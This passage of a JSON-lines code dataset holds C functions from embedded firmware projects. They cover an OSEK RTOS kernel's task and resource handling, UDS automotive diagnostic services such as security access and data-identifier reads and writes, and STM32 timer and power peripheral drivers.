}\n    // Insert it at task resource queue head\n    knl_rcb_next[ResID] = knl_tcb_resque[knl_curtsk];\n    knl_tcb_resque[knl_curtsk] = ResID;\n    END_DISABLE_INTERRUPT();\nOS_VALIDATE_ERROR_EXIT()\n    OsErrorProcess1(GetResource,resid,ResID);\n\treturn ercd;\n}", "path": "OpenRTOS\\src\\resource.c", "repo_name": "parai/OpenOSEK", "stars": 52, "license": "None", "language": "c", "size": 10250}
{"docstring": "/* @UDS Service: 0x27 */\n", "func_signal": "LOCAL void udsSecurityAccessFnc(void)", "code": "{\n\tUds_NrcType nrc = UDS_E_POSITIVERESPONSE;\n\tif(2u <= udsRte.rxLength)\n\t{\n\t\tuint8 subFnc = udsGetSerivceData(1);\n\t\tif((0x80U&subFnc) != 0u)\n\t\t{\n\t\t\tudsRte.suppressPosRspMsg = True;\n\t\t\tsubFnc = subFnc&0x7F;\n\t\t}\n\t\tif(0x01u == subFnc)\t// Request Seed\n\t\t{\n\t\t\tif(3u == udsRte.rxLength)\n\t\t\t{\n\t\t\t\tudsSecurityLevelRequested = udsGetSerivceData(2);\n\t\t\t\tif(udsCheckSecurityLevel(1<<udsSecurityLevelRequested))\n\t\t\t\t{\n\t\t\t\t\tudsSetResponseCode(1u,0x01);\n\t\t\t\t\tudsRte.txLength = 2 + 4 /* TODO key length */;\n\t\t\t\t\tmemset(udsGetResponseBuffer(2),0,4);\n\t\t\t\t\tnrc = UDS_E_POSITIVERESPONSE;\n\t\t\t\t}\n\t\t\t\telse\n\t\t\t\t{\n\t\t\t\t\tudsIsSeedRequested = True;\n\t\t\t\t\t// Create Response\n\t\t\t\t\tudsSetResponseCode(1u,0x01);\n\t\t\t\t\tudsRte.txLength = 2 + udsPrepareSeed(udsGetResponseBuffer(2));\n\t\t\t\t\tnrc = UDS_E_POSITIVERESPONSE;\n\t\t\t\t}\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tnrc = UDS_E_INCORRECTMESSAGELENGTHORINVALIDFORMAT;\n\t\t\t}\n\t\t}\n\t\telse if(0x02u == subFnc) // Send key\n\t\t{\n\t\t\tif(True == udsIsSeedRequested)\n\t\t\t{\n\t\t\t\tif(True == udsCompareKey(udsGetServiceBuffer(2),udsRte.rxLength-2))\n\t\t\t\t{\n\t\t\t\t\tudsRte.securityLevel = (1<<udsSecurityLevelRequested);\n\t\t\t\t\tudsIsSeedRequested = False;\n\t\t\t\t\t// Create Response\n\t\t\t\t\tudsSetResponseCode(1u,0x02);\n\t\t\t\t\tudsRte.txLength = 2;\n\t\t\t\t\tnrc = UDS_E_POSITIVERESPONSE;\n\t\t\t\t}\n\t\t\t\telse\n\t\t\t\t{\n\t\t\t\t\tnrc = UDS_E_CONDITIONSNOTCORRECT;\n\t\t\t\t}\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tnrc = UDS_E_REQUESTSEQUENCEERROR;\n\t\t\t}\n\t\t}\n\t\telse\n\t\t{\n\t\t\t// TODO: many sub - function not supported by me. add the process here\n\t\t\tnrc = UDS_E_SUBFUNCTIONNOTSUPPORTED;\n\t\t}\n\t}\n\telse\n\t{\n\t\tnrc = UDS_E_INCORRECTMESSAGELENGTHORINVALIDFORMAT;\n\t}\n\tudsProcessingDone(nrc);\n}", "path": "OpenCom\\src\\Uds.c", "repo_name": "parai/OpenOSEK", "stars": 52, "license": "None", "language": "c", "size": 10250}
{"docstring": "// search from priority \"from\" to 0.\n", "func_signal": "EXPORT PriorityType knl_bitmap_search(PriorityType from)", "code": "{\n\tuint8* pb;\n\tPriorityType offset;\n\tuint8 i;\n\n\tif(0 == from)\n\t{\n\t\treturn NUM_PRI; // no ready task\n\t}\n\n\tpb = knl_rdyque.bitmap;\n\tpb += (from>>3);\n\n\toffset = 1;\n\n\tif(0 != (*pb))\n\t{\n\t\tfor(i=(from&0x07) ; i>0 ; i--)\n\t\t{\n\t\t\tif(((*pb)&(1<<(i-1))) != 0)\n\t\t\t{\n\t\t\t\treturn (from -offset);\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\toffset ++;\n\t\t\t}\n\t\t}\n\t\t/* when here error */\n\t}\n\telse\n\t{\n\t\toffset += (from&0x07);\n\t}\n\n\twhile(pb != knl_rdyque.bitmap)\n\t{\n\t\tpb--;\n\t\tif(0 != (*pb))\n\t\t{\n\t\t\tfor(i=8 ; i>0 ; i--)\n\t\t\t{\n\t\t\t\tif(((*pb)&(1<<(i-1))) != 0)\n\t\t\t\t{\n\t\t\t\t\treturn (from -offset);\n\t\t\t\t}\n\t\t\t\telse\n\t\t\t\t{\n\t\t\t\t\toffset ++;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\telse\n\t\t{\n\t\t\toffset += 8;\n\t\t}\n\t}\n\n\treturn NUM_PRI;\n}", "path": "OpenRTOS\\src\\task.c", "repo_name": "parai/OpenOSEK", "stars": 52, "license": "None", "language": "c", "size": 10250}
{"docstring": "/* |                  | state into ready state all its events are cleared.         | */\n/* |------------------+------------------------------------------------------------| */\n/* | Status:          | Standard:                                                  | */\n/* |                  | 1) No error, E_OK                                          | */\n/* |                  | 2) Too many task activations of <TaskID>, E_OS_LIMIT       | */\n/* |                  | Extended:                                                  | */\n/* |                  | 1) Task <TaskID> is invalid, E_OS_ID                       | */\n/* |------------------+------------------------------------------------------------| */\n/* | Conformance:     | BCC1, BCC2, ECC1, ECC2                                     | */\n/* |------------------+------------------------------------------------------------| */\n", "func_signal": "EXPORT StatusType ActivateTask ( TaskType TaskID )", "code": "{\n\tStatusType ercd = E_OK;\n\tOS_STD_VALIDATE((TaskID<cfgOS_TASK_NUM),E_OS_ID);\n\n\tBEGIN_CRITICAL_SECTION();\n\tif(SUSPENDED == knl_tcb_state[TaskID])\n\t{\n\t\tknl_make_active(TaskID);\n\t\tdevTrace(tlOs,\"ActivateTask Task %d in SUSPENDED state.\\n\",(int)TaskID);\n\t}\n#if(cfgOS_MULTIPLY_ACTIVATION == 1)\n\telse\n\t{\n\t\tif(knl_tcb_activation[TaskID] < knl_tcb_max_activation[TaskID])\n\t\t{\n\t\t\tknl_ready_queue_insert(TaskID);\n\t\t\tknl_tcb_activation[TaskID] ++ ;\n\t\t\tdevTrace(tlOs,\"Multiply ActivateTask Task %d.\\n\",(int)TaskID);\n\t\t}\n\t\telse\n\t\t{\n\t\t\tercd = E_OS_LIMIT;\n\t\t}\n\t}\n#else\n\telse\n\t{\n\t\tercd = E_OS_LIMIT;\n\t}\n#endif\n\tEND_CRITICAL_SECTION();\nOS_VALIDATE_ERROR_EXIT()\n\tOsErrorProcess1(ActivateTask,tskid,TaskID);\n\treturn ercd;\n}", "path": "OpenRTOS\\src\\task.c", "repo_name": "parai/OpenOSEK", "stars": 52, "license": "None", "language": "c", "size": 10250}
{"docstring": "/* @UDS Service: 0x22 */\n", "func_signal": "LOCAL void udsRDIDFnc(void)", "code": "{\n\tUds_NrcType nrc = UDS_E_POSITIVERESPONSE;\n\tif(3u <= udsRte.rxLength)\n\t{\n\t\tuint8 didNbr = (udsRte.rxLength-1)/2;\n\t\tuint8 i,j;\n\t\tudsRte.txLength = 1;\n\t\tfor(i=0;i<didNbr;i++)\n\t\t{\n\t\t\tuint16 did = ((uint16)udsGetSerivceData(1+i*2)<<8) + udsGetSerivceData(2+i*2);\n\t\t\tfor(j=0;j<UdsConfig.rdidNbr;j++)\n\t\t\t{\n\t\t\t\tif(did == UdsConfig.rdidList[j].did)\n\t\t\t\t{\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\t\t\tif(j < UdsConfig.rdidNbr )\n\t\t\t{\n\t\t\t\tif(True == udsCheckSessionLevel(UdsConfig.rdidList[j].sessionMask))\n\t\t\t\t{\n\t\t\t\t\tif(True == udsCheckSecurityLevel(UdsConfig.rdidList[j].securityLevelMask) )\n\t\t\t\t\t{\n\t\t\t\t\t\tuint16 rlen;\n\t\t\t\t\t\tudsSetResponseCode(udsRte.txLength,did>>8);\n\t\t\t\t\t\tudsSetResponseCode(udsRte.txLength+1,did);\n\t\t\t\t\t\tudsRte.txLength += 2;\n\t\t\t\t\t\trlen = UdsConfig.rdidList[j].callout(udsGetResponseBuffer(udsRte.txLength),\n\t\t\t\t\t\t\t\tudsGetResponseBufferLength()-udsRte.txLength);\n\t\t\t\t\t\tif(rlen != 0u)\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tudsRte.txLength += rlen;\n\t\t\t\t\t\t}\n\t\t\t\t\t\telse\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tnrc = UDS_E_REQUESTOUTOFRANGE;\n\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\telse\n\t\t\t\t\t{\n\t\t\t\t\t\tnrc = UDS_E_SECUTITYACCESSDENIED;\n\t\t\t\t\t\tbreak;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\telse\n\t\t\t\t{\n\t\t\t\t\tnrc = UDS_E_SERVICENOTSUPPORTEDINACTIVESESSION;\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tnrc = UDS_E_REQUESTOUTOFRANGE;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t}\n\telse\n\t{\n\t\tnrc = UDS_E_INCORRECTMESSAGELENGTHORINVALIDFORMAT;\n\t}\n\tudsProcessingDone(nrc);\n}", "path": "OpenCom\\src\\Uds.c", "repo_name": "parai/OpenOSEK", "stars": 52, "license": "None", "language": "c", "size": 10250}
{"docstring": "/* |                  | an undefined state.                                          | */\n/* |------------------+--------------------------------------------------------------| */\n/* | Status:          | Standard:                                                    | */\n/* |                  | 1)No return to call level                                    | */\n/* |                  | Extended:                                                    | */\n/* |                  | 1) Task still occupies resources, E_OS_RESOURCE              | */\n/* |                  | 2) Call at interrupt level, E_OS_CALLEVEL                    | */\n/* |------------------+--------------------------------------------------------------| */\n/* | Conformance:     | BCC1, BCC2, ECC1, ECC2                                       | */\n/* |------------------+--------------------------------------------------------------| */\n", "func_signal": "EXPORT StatusType TerminateTask(void)", "code": "{\n    StatusType ercd = E_OK;\n    OS_EXT_VALIDATE((0 == knl_taskindp),E_OS_CALLEVEL);\n    OS_EXT_VALIDATE((INVALID_RESOURCE == knl_tcb_resque[knl_curtsk]),E_OS_RESOURCE);\n    DISABLE_INTERRUPT();\n    //release internal resource or for non-preemtable task\n    ReleaseInternalResource();\n#if( cfgOS_MULTIPLY_ACTIVATION == 1 )\n    if(knl_tcb_activation[knl_curtsk] > 0)\n    {\n    \tknl_tcb_activation[knl_curtsk] --;\n    \tknl_make_ready(knl_curtsk);\n    \tdevTrace(tlOs,\"TerminateTask Task %d, Goto READY state as Activation > 0.\\n\",(int)knl_curtsk);\n    }\n    else\n#endif\n    {\n    \tknl_tcb_state[knl_curtsk] = SUSPENDED;\n    \tdevTrace(tlOs,\"TerminateTask Task %d, Goto SUSPENDED state.\\n\",(int)knl_curtsk);\n    }\n    knl_search_schedtsk();\n\tassert(INVALID_TASK != knl_schedtsk);\n    knl_force_dispatch();\n\nOS_VALIDATE_ERROR_EXIT()\n    OsErrorProcess0(TerminateTask);\n    return ercd;\n}", "path": "OpenRTOS\\src\\task.c", "repo_name": "parai/OpenOSEK", "stars": 52, "license": "None", "language": "c", "size": 10250}
{"docstring": "/* |                  | resource assigned (preemptable tasks).                      | */\n/* |------------------+-------------------------------------------------------------| */\n/* | Status:          | Standard:                                                   | */\n/* |                  | 1. No error, E_OK                                           | */\n/* |                  | Extended:                                                   | */\n/* |                  | 1. Call at interrupt level, E_OS_CALLEVEL                   | */\n/* |                  | 2. Calling task occupies resources, E_OS_RESOURCE           | */\n/* |------------------+-------------------------------------------------------------| */\n/* | Conformance:     | BCC1, BCC2, ECC1, ECC2                                      | */\n/* |------------------+-------------------------------------------------------------| */\n", "func_signal": "StatusType Schedule ( void )", "code": "{\n    StatusType ercd = E_OK;\n    OS_EXT_VALIDATE((0 == knl_taskindp),E_OS_CALLEVEL);\n    OS_EXT_VALIDATE((INVALID_RESOURCE == knl_tcb_resque[knl_curtsk]),E_OS_RESOURCE);\n\n\tBEGIN_CRITICAL_SECTION();\n\t//if task has internal resource or task is non-premtable\n\tif((knl_rdyque.top_pri > knl_tcb_ipriority[knl_curtsk]) &&\n\t\t(NUM_PRI != knl_rdyque.top_pri))\n\t{\t//release internal resource or for Non-Preemtable Task\n    \tReleaseInternalResource();\n        knl_reschedule();\n    }\n\tEND_CRITICAL_SECTION();\n\n\t//re-get internal resource or for Non-Preemtable task\n\tGetInternalResource();\n\nOS_VALIDATE_ERROR_EXIT()\n\tOsErrorProcess0(Schedule);\n    return ercd;\n}", "path": "OpenRTOS\\src\\task.c", "repo_name": "parai/OpenOSEK", "stars": 52, "license": "None", "language": "c", "size": 10250}
{"docstring": "//mean start the SystemTick ISR timer.\n//here the test board I use has a 16 MHZ oscillator\n//modify it if you have a different board and want a different\n//SystemTick ISR frequency\n", "func_signal": "LOCAL void portStartSystemTimer( void )", "code": "{\n\trOut(rSysTickLoad,(CPU_FREQUENCY/1000)-1);\t/* set reload register */\n\tportNVICSetPriority(-1,1u<<4-1);\t\t\t/* set Priority for Cortex-M0 System Interrupts */\n\trOut(rSysTickVal,0);\n\trOut(rSysTickCtrl,(1u<<2)|(1u<<1)|(1u<<0)); /* Enable SysTick IRQ and SysTick Timer */\n}", "path": "OpenRTOS\\src\\portable\\at91sam3s\\portable.c", "repo_name": "parai/OpenOSEK", "stars": 52, "license": "None", "language": "c", "size": 10250}
{"docstring": "/* @UDS Service: 0x28 */\n", "func_signal": "LOCAL void udsCommunicationControlFnc(void)", "code": "{\n\tUds_NrcType nrc = UDS_E_POSITIVERESPONSE;\n\tif(3u == udsRte.rxLength)\n\t{\n\t\tuint8 subFnc = udsGetSerivceData(1); //\n\t\tif((0x80U&subFnc) != 0)\n\t\t{\n\t\t\tudsRte.suppressPosRspMsg = True;\n\t\t\tsubFnc = subFnc&0x7F;\n\t\t}\n\t\t// TODO: Add Special Process For Your App here\n\t\tswitch(subFnc)\n\t\t{\n\t\t\tcase 0x00: //enableRxAndTx\n\t\t\t\tif(0x02 == udsGetSerivceData(2))  // CTP is NWMCP\n\t\t\t\t{\t// This is just a example\n\t\t\t\t\tTalkNM(0);\n\t\t\t\t}\n\t\t\t\telse\n\t\t\t\t{\n\t\t\t\t\tnrc = UDS_E_CONDITIONSNOTCORRECT;\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t\tcase 0x01: //enableRxAndDisableTx\n\t\t\t\tif(0x02 == udsGetSerivceData(2))  // CTP is NWMCP\n\t\t\t\t{\t// This is just a example\n\t\t\t\t\tSilentNM(0);\n\t\t\t\t}\n\t\t\t\telse\n\t\t\t\t{\n\t\t\t\t\tnrc = UDS_E_CONDITIONSNOTCORRECT;\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t\tcase 0x02: //disableRxAndEnableTx\n\t\t\t\tnrc = UDS_E_SUBFUNCTIONNOTSUPPORTED;\n\t\t\t\tbreak;\n\t\t\tcase 0x03: //disableRxAndTx\n\t\t\t\tnrc = UDS_E_SUBFUNCTIONNOTSUPPORTED;\n\t\t\t\tbreak;\n\t\t\tdefault:\n\t\t\t\tnrc = UDS_E_SUBFUNCTIONNOTSUPPORTED;\n\t\t\t\tbreak;\n\t\t}\n\t\tif(UDS_E_POSITIVERESPONSE == nrc)\n\t\t{\n\t\t\tudsRte.txLength = 2;\n\t\t\tudsSetResponseCode(1,udsGetSerivceData(1));\n\t\t}\n\t}\n\telse\n\t{\n\t\tnrc = UDS_E_INCORRECTMESSAGELENGTHORINVALIDFORMAT;\n\t}\n\tudsProcessingDone(nrc);\n}", "path": "OpenCom\\src\\Uds.c", "repo_name": "parai/OpenOSEK", "stars": 52, "license": "None", "language": "c", "size": 10250}
{"docstring": "// ready to run, but not runnable(cann't be scheduled),\n// not in the ready queue\n", "func_signal": "EXPORT void knl_make_ready(TaskType taskid)", "code": "{\n\tknl_tcb_state[taskid] = READY;\n\tknl_tcb_curpri[taskid] = knl_tcb_ipriority[taskid];\n\t#if(cfgOS_FLAG_NUM > 0)\n\t{\n\t\tuint8 flgid = knl_tcb_flgid[taskid];\n\t\tif(flgid != INVALID_FLAG)\n\t\t{\n\t\t\tknl_fcb_wait[flgid]=NO_EVENT;\n\t\t\tknl_fcb_set[flgid]=NO_EVENT;\n\t\t}\n\t}\n\t#endif\n#if(cfgOS_S_RES_NUM > 0)\n\tknl_tcb_resque[taskid] = INVALID_RESOURCE;\n#endif\n\tknl_setup_context(taskid);\n}", "path": "OpenRTOS\\src\\task.c", "repo_name": "parai/OpenOSEK", "stars": 52, "license": "None", "language": "c", "size": 10250}
{"docstring": "//no matter what,will put current ready task to the ready queue\n//and the high ready task <toptsk> will be dispatched.\n", "func_signal": "EXPORT void knl_reschedule( void )", "code": "{\n\tTaskType toptsk;\n\n\ttoptsk = knl_ready_queue_top();\n\tif ( knl_schedtsk != toptsk ){\n\t\ttoptsk = knl_schedtsk;\n\t\tknl_search_schedtsk();\t// will delete the toptsk, and make knl_schedtsk = toptsk.\n\t    knl_ready_queue_insert_top(toptsk);\n\t}\n}", "path": "OpenRTOS\\src\\task.c", "repo_name": "parai/OpenOSEK", "stars": 52, "license": "None", "language": "c", "size": 10250}
{"docstring": "/* |                  | routines (see Figure 12-1(os223)).                      | */\n/* |                  | 2. This service is intended to be used by library       | */\n/* |                  | functions and hook routines.                            | */\n/* |                  | 3. If <TaskID> can't be evaluated (no task currently    | */\n/* |                  | running), the service returns INVALID_TASK as TaskType. | */\n/* |------------------+---------------------------------------------------------| */\n/* | Status:          | Standard:  No error, E_OK                               | */\n/* |                  | Extended:  No error, E_OK                               | */\n/* |------------------+---------------------------------------------------------| */\n/* | Conformance:     | BCC1, BCC2, ECC1, ECC2                                  | */\n/* |------------------+---------------------------------------------------------| */\n", "func_signal": "StatusType GetTaskID ( TaskRefType TaskID )", "code": "{\n\t*TaskID = knl_curtsk;\n\treturn E_OK;\n}", "path": "OpenRTOS\\src\\task.c", "repo_name": "parai/OpenOSEK", "stars": 52, "license": "None", "language": "c", "size": 10250}
{"docstring": "/* @UDS Service: 0x22 */\n", "func_signal": "LOCAL void udsWDIDFnc(void)", "code": "{\n\tUds_NrcType nrc = UDS_E_POSITIVERESPONSE;\n\tif(3u < udsRte.rxLength)\n\t{\n\t\tuint16 did = ((uint16)udsGetSerivceData(1)<<8) + udsGetSerivceData(2);\n\t\tuint8 i;\n\t\tfor(i=0;i<UdsConfig.wdidNbr;i++)\n\t\t{\n\t\t\tif(did == UdsConfig.wdidList[i].did)\n\t\t\t{\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t\tif(i < UdsConfig.wdidNbr )\n\t\t{\n\t\t\tif(True == udsCheckSessionLevel(UdsConfig.wdidList[i].sessionMask))\n\t\t\t{\n\t\t\t\tif(True == udsCheckSecurityLevel(UdsConfig.wdidList[i].securityLevelMask) )\n\t\t\t\t{\n\t\t\t\t\tStatusType ercd;\n\t\t\t\t\tercd = UdsConfig.wdidList[i].callout(udsGetServiceBuffer(3),udsRte.rxLength-3);\n\t\t\t\t\tif(E_OK == ercd)\n\t\t\t\t\t{\n\t\t\t\t\t\tudsSetResponseCode(1,did>>8);\n\t\t\t\t\t\tudsSetResponseCode(2,did);\n\t\t\t\t\t\tudsRte.txLength = 3;\n\t\t\t\t\t}\n\t\t\t\t\telse\n\t\t\t\t\t{\n\t\t\t\t\t\tnrc = UDS_E_GENERALPROGRAMMINGFAILURE;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\telse\n\t\t\t\t{\n\t\t\t\t\tnrc = UDS_E_SECUTITYACCESSDENIED;\n\t\t\t\t}\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tnrc = UDS_E_SERVICENOTSUPPORTEDINACTIVESESSION;\n\t\t\t}\n\t\t}\n\t\telse\n\t\t{\n\t\t\tnrc = UDS_E_REQUESTOUTOFRANGE;\n\t\t}\n\t}\n\telse\n\t{\n\t\tnrc = UDS_E_INCORRECTMESSAGELENGTHORINVALIDFORMAT;\n\t}\n\tudsProcessingDone(nrc);\n}", "path": "OpenCom\\src\\Uds.c", "repo_name": "parai/OpenOSEK", "stars": 52, "license": "None", "language": "c", "size": 10250}
{"docstring": "/**\n  * @brief  Enters STANDBY mode.\n  * @param  None\n  * @retval None\n  */\n", "func_signal": "void PWR_EnterSTANDBYMode(void)", "code": "{\n  /* Clear Wake-up flag */\n  PWR->CR |= PWR_CR_CWUF;\n  /* Select STANDBY mode */\n  PWR->CR |= PWR_CR_PDDS;\n  /* Set SLEEPDEEP bit of Cortex System Control Register */\n  SCB->SCR |= SCB_SCR_SLEEPDEEP;\n/* This option is used to ensure that store operations are completed */\n#if defined ( __CC_ARM   )\n  __force_stores();\n#endif\n  /* Request Wait For Interrupt */\n  __WFI();\n}", "path": "Firmware\\stm_lib\\src\\stm32f10x_pwr.c", "repo_name": "facebookarchive/LatencyTester", "stars": 61, "license": "None", "language": "c", "size": 2387}
{"docstring": "/**\n  * @brief  Sets the TIMx Input Capture 4 prescaler.\n  * @param  TIMx: where x can be 1, 2, 3, 4, 5 or 8 to select the TIM peripheral.\n  * @param  TIM_ICPSC: specifies the Input Capture4 prescaler new value.\n  *   This parameter can be one of the following values:\n  *     @arg TIM_ICPSC_DIV1: no prescaler\n  *     @arg TIM_ICPSC_DIV2: capture is done once every 2 events\n  *     @arg TIM_ICPSC_DIV4: capture is done once every 4 events\n  *     @arg TIM_ICPSC_DIV8: capture is done once every 8 events\n  * @retval None\n  */\n", "func_signal": "void TIM_SetIC4Prescaler(TIM_TypeDef* TIMx, uint16_t TIM_ICPSC)", "code": "{  \n  /* Check the parameters */\n  assert_param(IS_TIM_LIST3_PERIPH(TIMx));\n  assert_param(IS_TIM_IC_PRESCALER(TIM_ICPSC));\n  /* Reset the IC4PSC Bits */\n  TIMx->CCMR2 &= (uint16_t)~((uint16_t)TIM_CCMR2_IC4PSC);\n  /* Set the IC4PSC value */\n  TIMx->CCMR2 |= (uint16_t)(TIM_ICPSC << 8);\n}", "path": "Firmware\\stm_lib\\src\\stm32f10x_tim.c", "repo_name": "facebookarchive/LatencyTester", "stars": 61, "license": "None", "language": "c", "size": 2387}
{"docstring": "/**\n  * @brief  Sets the TIMx Clock Division value.\n  * @param  TIMx: where x can be  1 to 17 except 6 and 7 to select \n  *   the TIM peripheral.\n  * @param  TIM_CKD: specifies the clock division value.\n  *   This parameter can be one of the following value:\n  *     @arg TIM_CKD_DIV1: TDTS = Tck_tim\n  *     @arg TIM_CKD_DIV2: TDTS = 2*Tck_tim\n  *     @arg TIM_CKD_DIV4: TDTS = 4*Tck_tim\n  * @retval None\n  */\n", "func_signal": "void TIM_SetClockDivision(TIM_TypeDef* TIMx, uint16_t TIM_CKD)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_TIM_LIST8_PERIPH(TIMx));\n  assert_param(IS_TIM_CKD_DIV(TIM_CKD));\n  /* Reset the CKD Bits */\n  TIMx->CR1 &= (uint16_t)~((uint16_t)TIM_CR1_CKD);\n  /* Set the CKD value */\n  TIMx->CR1 |= TIM_CKD;\n}", "path": "Firmware\\stm_lib\\src\\stm32f10x_tim.c", "repo_name": "facebookarchive/LatencyTester", "stars": 61, "license": "None", "language": "c", "size": 2387}
{"docstring": "/**\n  * @brief  Configure the TI3 as Input.\n  * @param  TIMx: where x can be 1, 2, 3, 4, 5 or 8 to select the TIM peripheral.\n  * @param  TIM_ICPolarity : The Input Polarity.\n  *   This parameter can be one of the following values:\n  *     @arg TIM_ICPolarity_Rising\n  *     @arg TIM_ICPolarity_Falling\n  * @param  TIM_ICSelection: specifies the input to be used.\n  *   This parameter can be one of the following values:\n  *     @arg TIM_ICSelection_DirectTI: TIM Input 3 is selected to be connected to IC3.\n  *     @arg TIM_ICSelection_IndirectTI: TIM Input 3 is selected to be connected to IC4.\n  *     @arg TIM_ICSelection_TRC: TIM Input 3 is selected to be connected to TRC.\n  * @param  TIM_ICFilter: Specifies the Input Capture Filter.\n  *   This parameter must be a value between 0x00 and 0x0F.\n  * @retval None\n  */\n", "func_signal": "static void TI3_Config(TIM_TypeDef* TIMx, uint16_t TIM_ICPolarity, uint16_t TIM_ICSelection,\n                       uint16_t TIM_ICFilter)", "code": "{\n  uint16_t tmpccmr2 = 0, tmpccer = 0, tmp = 0;\n  /* Disable the Channel 3: Reset the CC3E Bit */\n  TIMx->CCER &= (uint16_t)~((uint16_t)TIM_CCER_CC3E);\n  tmpccmr2 = TIMx->CCMR2;\n  tmpccer = TIMx->CCER;\n  tmp = (uint16_t)(TIM_ICPolarity << 8);\n  /* Select the Input and set the filter */\n  tmpccmr2 &= (uint16_t)(((uint16_t)~((uint16_t)TIM_CCMR2_CC3S)) & ((uint16_t)~((uint16_t)TIM_CCMR2_IC3F)));\n  tmpccmr2 |= (uint16_t)(TIM_ICSelection | (uint16_t)(TIM_ICFilter << (uint16_t)4));\n    \n  if((TIMx == TIM1) || (TIMx == TIM8) || (TIMx == TIM2) || (TIMx == TIM3) ||\n     (TIMx == TIM4) ||(TIMx == TIM5))\n  {\n    /* Select the Polarity and set the CC3E Bit */\n    tmpccer &= (uint16_t)~((uint16_t)(TIM_CCER_CC3P));\n    tmpccer |= (uint16_t)(tmp | (uint16_t)TIM_CCER_CC3E);\n  }\n  else\n  {\n    /* Select the Polarity and set the CC3E Bit */\n    tmpccer &= (uint16_t)~((uint16_t)(TIM_CCER_CC3P | TIM_CCER_CC3NP));\n    tmpccer |= (uint16_t)(TIM_ICPolarity | (uint16_t)TIM_CCER_CC3E);\n  }\n  \n  /* Write to TIMx CCMR2 and CCER registers */\n  TIMx->CCMR2 = tmpccmr2;\n  TIMx->CCER = tmpccer;\n}", "path": "Firmware\\stm_lib\\src\\stm32f10x_tim.c", "repo_name": "facebookarchive/LatencyTester", "stars": 61, "license": "None", "language": "c", "size": 2387}
{"docstring": "/**\n  * @brief  Sets the TIMx Input Capture 2 prescaler.\n  * @param  TIMx: where x can be 1, 2, 3, 4, 5, 8, 9, 12 or 15 to select the TIM peripheral.\n  * @param  TIM_ICPSC: specifies the Input Capture2 prescaler new value.\n  *   This parameter can be one of the following values:\n  *     @arg TIM_ICPSC_DIV1: no prescaler\n  *     @arg TIM_ICPSC_DIV2: capture is done once every 2 events\n  *     @arg TIM_ICPSC_DIV4: capture is done once every 4 events\n  *     @arg TIM_ICPSC_DIV8: capture is done once every 8 events\n  * @retval None\n  */\n", "func_signal": "void TIM_SetIC2Prescaler(TIM_TypeDef* TIMx, uint16_t TIM_ICPSC)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_TIM_LIST6_PERIPH(TIMx));\n  assert_param(IS_TIM_IC_PRESCALER(TIM_ICPSC));\n  /* Reset the IC2PSC Bits */\n  TIMx->CCMR1 &= (uint16_t)~((uint16_t)TIM_CCMR1_IC2PSC);\n  /* Set the IC2PSC value */\n  TIMx->CCMR1 |= (uint16_t)(TIM_ICPSC << 8);\n}", "path": "Firmware\\stm_lib\\src\\stm32f10x_tim.c", "repo_name": "facebookarchive/LatencyTester", "stars": 61, "license": "None", "language": "c", "size": 2387}
{"docstring": "/**\n  * @brief  Initializes the TIMx Channel4 according to the specified\n  *         parameters in the TIM_OCInitStruct.\n  * @param  TIMx: where x can be  1, 2, 3, 4, 5 or 8 to select the TIM peripheral.\n  * @param  TIM_OCInitStruct: pointer to a TIM_OCInitTypeDef structure\n  *         that contains the configuration information for the specified TIM peripheral.\n  * @retval None\n  */\n", "func_signal": "void TIM_OC4Init(TIM_TypeDef* TIMx, TIM_OCInitTypeDef* TIM_OCInitStruct)", "code": "{\n  uint16_t tmpccmrx = 0, tmpccer = 0, tmpcr2 = 0;\n   \n  /* Check the parameters */\n  assert_param(IS_TIM_LIST3_PERIPH(TIMx)); \n  assert_param(IS_TIM_OC_MODE(TIM_OCInitStruct->TIM_OCMode));\n  assert_param(IS_TIM_OUTPUT_STATE(TIM_OCInitStruct->TIM_OutputState));\n  assert_param(IS_TIM_OC_POLARITY(TIM_OCInitStruct->TIM_OCPolarity));   \n  /* Disable the Channel 2: Reset the CC4E Bit */\n  TIMx->CCER &= (uint16_t)(~((uint16_t)TIM_CCER_CC4E));\n  \n  /* Get the TIMx CCER register value */\n  tmpccer = TIMx->CCER;\n  /* Get the TIMx CR2 register value */\n  tmpcr2 =  TIMx->CR2;\n  \n  /* Get the TIMx CCMR2 register value */\n  tmpccmrx = TIMx->CCMR2;\n    \n  /* Reset the Output Compare mode and Capture/Compare selection Bits */\n  tmpccmrx &= (uint16_t)(~((uint16_t)TIM_CCMR2_OC4M));\n  tmpccmrx &= (uint16_t)(~((uint16_t)TIM_CCMR2_CC4S));\n  \n  /* Select the Output Compare Mode */\n  tmpccmrx |= (uint16_t)(TIM_OCInitStruct->TIM_OCMode << 8);\n  \n  /* Reset the Output Polarity level */\n  tmpccer &= (uint16_t)(~((uint16_t)TIM_CCER_CC4P));\n  /* Set the Output Compare Polarity */\n  tmpccer |= (uint16_t)(TIM_OCInitStruct->TIM_OCPolarity << 12);\n  \n  /* Set the Output State */\n  tmpccer |= (uint16_t)(TIM_OCInitStruct->TIM_OutputState << 12);\n    \n  if((TIMx == TIM1) || (TIMx == TIM8))\n  {\n    assert_param(IS_TIM_OCIDLE_STATE(TIM_OCInitStruct->TIM_OCIdleState));\n    /* Reset the Output Compare IDLE State */\n    tmpcr2 &= (uint16_t)(~((uint16_t)TIM_CR2_OIS4));\n    /* Set the Output Idle state */\n    tmpcr2 |= (uint16_t)(TIM_OCInitStruct->TIM_OCIdleState << 6);\n  }\n  